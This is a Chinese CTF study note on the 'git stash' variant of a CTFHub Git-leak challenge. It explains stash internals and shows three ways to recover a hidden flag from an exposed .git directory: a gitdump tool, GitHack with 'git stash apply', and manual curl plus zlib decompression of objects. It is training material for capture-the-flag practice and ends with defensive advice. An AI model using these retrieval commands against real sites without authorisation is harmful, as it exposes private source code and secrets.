## Stash 变式 -- 考点精讲

> 前置知识：[[Git泄露|Git 泄露]] -- 先读 Git 泄露主考点，理解 .git 对象模型后再看本变式
>
> 关联教程：[[../../../../../git.md#nav-12|git.md 12 章 git stash]] · [[../../../../../git.md#nav-17|git.md 17 章内部原理与文件存储]]

### 考点变式：stash 提交泄露

`git stash` 本意是把未提交的改动"临时收起来"，但 CTF 出题人会**故意把 flag 藏进 stash**：

| 步骤 | 提交信息（logs 中可见） | 动作 |
|------|------------------------|------|
| 1 | `init` | 初始化仓库 |
| 2 | `add flag` | 添加**占位符** flag 文件（如内容 `where is flag`）并提交 |
| 3 | （无新提交） | 把文件改成**真 flag**，然后 `git stash` 收起来 |
| 4 | `reset: moving to HEAD` | `git reset` 回退，抹掉痕迹 |
| 5 | `remove flag` | 删除 flag 文件并提交 |

**关键点**：真 flag 不在任何分支提交里，而是被 `git stash` 收到 `refs/stash`。普通解法（只看分支历史）会拿到 `add flag` 提交里的占位符——这就是陷阱所在。

### stash 的底层原理（为什么藏在 refs/stash）

stash 是一个**特殊提交**，与普通提交有两处不同：

1. **引用位置**：普通提交挂在 `refs/heads/master`，stash 挂在 `refs/stash`——所以 `git log` 看不到它，只有 `git stash list`、`git log --all`、`git reflog` 能看到
2. **双亲提交**：普通提交只有 1 个 parent，stash 有 **2 个 parent**（原分支 HEAD + 当时的暂存区快照）

```
stash 提交（refs/stash）
  ├─ tree  ← 真 flag 文件在这里
  ├─ parent 原分支 HEAD
  └─ parent 暂存区快照
```

所以**真 flag 藏在 stash 的 tree 里**，而不是 add flag 提交的 tree 里。判断方向的方法见下。

### 如何看 git 日志信息（找 stash 的痕迹）

git 泄露时先看两个日志文件：

```bash
# 1. 分支提交历史（只能看到 init/add flag/remove flag）
curl -s "http://目标/.git/logs/HEAD"
# 0000000... xxxxxxx init
# xxxxxxx... 902a12e add flag
# 902a12e... yyyyyyy reset: moving to HEAD
# yyyyyyy... zzzzzzz remove flag

# 2. 关键：logs/refs/stash 暴露 stash 操作
curl -s "http://目标/.git/logs/refs/stash"
# 0000000... 97d4f58 WIP on master: 902a12e add flag  <-- 暴露 stash！
```

`logs/refs/stash` 存在 = 仓库里藏了 stash。同时 `refs/stash` 文件内容就是 stash 提交的 sha1：

```bash
curl -s "http://目标/.git/refs/stash"
# 97d4f58456ebdc5635d57d19143e77575b1977d2
```

### 如何判断 flag 在 git 的哪里（方向判断）

下载几个关键对象对比，即可确定真 flag 位置：

```bash
# 1. stash 提交（97d4f58...）——看它的 tree 和双 parent
curl -s "http://目标/.git/objects/97/d4f58456ebdc5635d57d19143e77575b1977d2" | python3 -c "import zlib,sys; print(zlib.decompress(sys.stdin.buffer.read()).decode())"
# commit ... tree dfe63c27...    <-- stash 的 tree（真 flag 候选）
# parent 902a12e...              <-- 原分支 HEAD
# parent a983d7d...              <-- 暂存区快照

# 2. add flag 提交（902a12e...）的 tree——对比用
curl -s "http://目标/.git/objects/90/2a12e..." | python3 -c "import zlib,sys; print(zlib.decompress(sys.stdin.buffer.read()).decode())"
# tree c96cbca4...              <-- add flag 的 tree

# 3. 分别解析两个 tree 里的同名文件 blob
#    add flag 的 tree c96cbca4... → blob e358b09f... → "where is flag"（占位符！）
#    stash 的 tree dfe63c27...  → blob b294e836... → 真 flag
```

| 对象 | 内容 | 结论 |
|------|------|------|
| `add flag` tree | 文件 blob → `where is flag` | 占位符，**陷阱** |
| `stash` tree | 文件 blob → `ctfhub{...}` | **真 flag** |

判断口诀：**先看 `logs/refs/stash` 有没有，再对比 add flag 与 stash 的 tree**——flag 方向在 stash 的 tree 里。

### 题目解法

> CTFHub 技能树位置：CTFHub → Web → Web 信息泄露 → Git泄露（stash 变式题）
>
> 提示：用自研工具 [[../../Web工具配置/目录爆破/遍历脚本|trav]] 同风格的 `gitdump` 一条命令即可，工具已内置 stash 探测。

解法一（gitdump，最快）：

```bash
gitdump "http://目标/" --out restore
# [*] 日志: 5 次提交
# [+] 提交历史:
#     ...  init
#     ...  add flag
#     ...  reset: moving to HEAD
#     ...  remove flag
#     ...  stash: WIP on master: 902a12e add flag   <-- 探测到 stash
# [+] 恢复文件: 228961921227229.txt ...
# gitdump 检测到 stash 时优先恢复 stash 版本文件

cat restore/228961921227229.txt
# ctfhub{17e3c1c94c62c72c904715f7}
```

解法二（GitHack + 本地 git，标准工具链）：

```bash
# 1. GitHack 下载完整 .git 目录
git clone https://github.com/BugScanTeam/GitHack
python3 GitHack.py "http://目标/.git/"
# [+] Clone Success. Dist File : ./dist/目标
# 注意：GitHack 按 index 恢复文件，得到的是占位符版本（"where is flag"）
cat dist/目标/228961921227229.txt     # where is flag

# 2. 但完整 .git 已下载，在本地用 git 命令操作 stash
cd dist/目标
git stash list
# stash@{0}: WIP on master: 902a12e add flag   <-- 真 flag 在此
git stash apply
cat 228961921227229.txt
# ctfhub{17e3c1c94c62c72c904715f7}            <-- 真 flag
```

解法三（手工对象链，理解原理）：

```bash
# 1. 确认 stash 存在，拿 sha1
curl -s "http://目标/.git/logs/refs/stash"
curl -s "http://目标/.git/refs/stash"     # 97d4f58456ebdc5635d57d19143e77575b1977d2

# 2. 解压 stash 提交 → 拿 tree（dfe63c27...）
curl -s "http://目标/.git/objects/97/d4f58456ebdc5635d57d19143e77575b1977d2" | python3 -c "import zlib,sys; print(zlib.decompress(sys.stdin.buffer.read()).decode())"

# 3. 解压 tree → 拿文件 blob sha（b294e836...），注意 tree 是二进制用 hex 解析
curl -s "http://目标/.git/objects/df/e63c27..." -o tree.bin
python3 -c "import zlib; print(zlib.decompress(open('tree.bin','rb').read()).hex())"

# 4. 下载 blob 解压即得 flag
curl -s "http://目标/.git/objects/b2/94e836..." | python3 -c "import zlib,sys; print(zlib.decompress(sys.stdin.buffer.read()).decode())"
# ctfhub{17e3c1c94c62c72c904715f7}
```

> 本地实测（复现题）：同流程在本地 mock 仓库验证——`git dump` 探测 `refs/stash` 并优先恢复 stash 版文件；GitHack 需配合本地 `git stash list` + `git stash apply` 才能取到真 flag。

### 易错点

| 易错点 | 说明 |
|-------|------|
| **占位符陷阱** | `add flag` 提交里的文件内容是 `where is flag`，不是真 flag |
| **GitHack 恢复的是 index 版** | GitHack 按 index（暂存区）恢复文件，拿到的是占位符；真 flag 需下载完整 .git 后本地 `git stash apply` |
| **普通 git log 看不到 stash** | 必须 `git log --all` / `git stash list` / 看 `logs/refs/stash` |
| **只看 logs/HEAD 会漏** | `logs/HEAD` 只显示分支历史，stash 痕迹在 `logs/refs/stash` |
| **reset 抹不掉 stash** | 出题人 reset 只是移分支指针，`refs/stash` 引用与对象仍在 |

### 同类变式（信息泄露大类）

| 考点 | 说明 | 终端提取 |
|------|------|---------|
| **Git 泄露**（主考点） | .git 目录可访问，历史源码全还原 | `gitdump URL` |
| **Git stash 变式**（本题） | flag 被 git stash 收进 `refs/stash` | `gitdump URL`（自动探测 stash） |
| **SVN 泄露** | `.svn/` 目录可访问，同原理还原历史 | 专用工具或手工下载 `.svn` 文件 |
| **HG 泄露** | `.hg/` 目录可访问，fncache + revlog 全泄露 | `hgdump URL` |
| **备份文件下载** | 各种备份文件泄露源码/文件清单 | 见 [[../备份文件下载/bak文件\|bak文件]]、[[../备份文件下载/网站源码\|网站源码]] |
| **vim 缓存** | `.index.php.swp` 残留源码 | 见 [[../备份文件下载/vim缓存\|vim缓存]] |
| **DS_Store** | macOS 目录元数据泄露文件清单 | `dsstore --notes URL/.DS_Store`，见 [[../备份文件下载/DS_Store\|DS_Store]] |
| 目录索引泄露 | 目录列表直接可见文件名 | 见 [[../目录遍历\|目录遍历]] |
| phpinfo | 环境变量/配置泄露 | 见 [[../phpinfo\|phpinfo]] |

### 核心知识点总结

| 概念 | 说明 |
|------|------|
| stash 是特殊提交 | 挂在 `refs/stash`（不在分支上），普通 `git log` 看不到 |
| stash 有双 parent | 原分支 HEAD + 暂存区快照，真 flag 在 stash 的 tree 里 |
| logs/refs/stash | 暴露 stash 操作的痕迹（`WIP on master: ...`） |
| refs/stash 文件 | 直接给出 stash 提交 sha1 |
| 占位符陷阱 | add flag 提交是 `where is flag`，真 flag 在 stash 里 |
| gitdump | 自研工具，自动探测 stash 并优先恢复 stash 版本文件 |
| GitHack + git | 标准工具链：下载完整 .git → `git stash list` → `git stash apply` |
| 防御角度 | 部署不带 .git；服务器禁止访问隐藏目录 |

### 关联教程

- [[Git泄露|Git 泄露主考点]] -- 本变式的前置知识
- [[../../../../../git.md#nav-12|git.md 12 章 git stash]] -- stash 命令族与查看记录
- [[../../../../../git.md#nav-17|git.md 17 章内部原理与文件存储]] -- 对象模型与手动读取
- [[../备份文件下载/DS_Store|DS_Store]] -- dsstore 工具（gitdump 的姊妹工具）
- [[../备份文件下载/bak文件|bak文件]] -- 单文件备份直接泄露源码
- [[../../Web|Web 方向总览]] -- Web CTF 方向入口
- [[../../../ctf解法与理论总目录|CTF 总目录]] -- CTF 理论学习与练习平台
